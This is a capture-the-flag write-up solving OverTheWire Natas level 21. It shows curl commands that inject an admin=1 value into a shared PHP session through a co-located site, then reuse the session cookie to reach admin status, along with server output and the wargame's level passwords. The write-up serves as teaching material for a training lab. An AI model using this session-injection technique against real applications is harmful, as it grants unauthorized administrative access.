# Natas Level 21
```bash
Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
URL:      http://natas21.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas21.png" />
    <div align="center">Natas 21</div>
</figure>

And the [source code](http://natas21.natas.labs.overthewire.org/index-source.html):
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas21-view-sourcecode.png" />
    <div align="center">Natas 21 - View sourcecode</div>
</figure>

Again, we need admin=1 in the session data

```bash
Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org
```

Checking the co-located site:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas21-colocated-website.png" />
    <div align="center">Natas 21 - Co-located site</div>
</figure>

And its [source code](http://natas21-experimenter.natas.labs.overthewire.org/index-source.html):
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas21-colocated-website-view-sourcecode.png" />
    <div align="center">Natas 21 - Co-located site - View sourcecode</div>
</figure>

Both site are co-located so they share session IDs.
```php
$form .= '<form action="index.php" method="POST">'; 
foreach($validkeys as $key => $defval) { 
    $val = $defval; 
    if(array_key_exists($key, $_SESSION)) { 
        $val = $_SESSION[$key]; 
    } else { 
        $_SESSION[$key] = $val; 
    } 
    $form .= "$key: <input name='$key' value='$val' /><br>"; 
}
```

We can see the session data being saved from the POST parameters.

We just need to submit another key/value (admin=1), lets use cURL:
```bash
curl -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ --cookie-jar - -L 'http://natas21-experimenter.natas.labs.overthewire.org?submit&debug&admin=1'
```

We get:
```bash
<html>
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
[DEBUG] Session contents:<br>Array
(
[submit] => 
[debug] => 
[admin] => 1
)

<p>Example:</p>
<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
# Netscape HTTP Cookie File
# http://curl.haxx.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_natas21-experimenter.natas.labs.overthewire.org FALSE / FALSE 0 PHPSESSID hkrbr62hu6choo542bi5ufq2v2
```

And using the cookie(PHPSESSID=hkrbr62hu6choo542bi5ufq2v2):
```bash
curl -b PHPSESSID=hkrbr62hu6choo542bi5ufq2v2 -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ 'http://natas21.natas.labs.overthewire.org/index.php'
```

We get:
```bash
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "IFekPyrQXftziDEsUr3x21sYuahypdgJ" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We got the password for the next level: **chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ**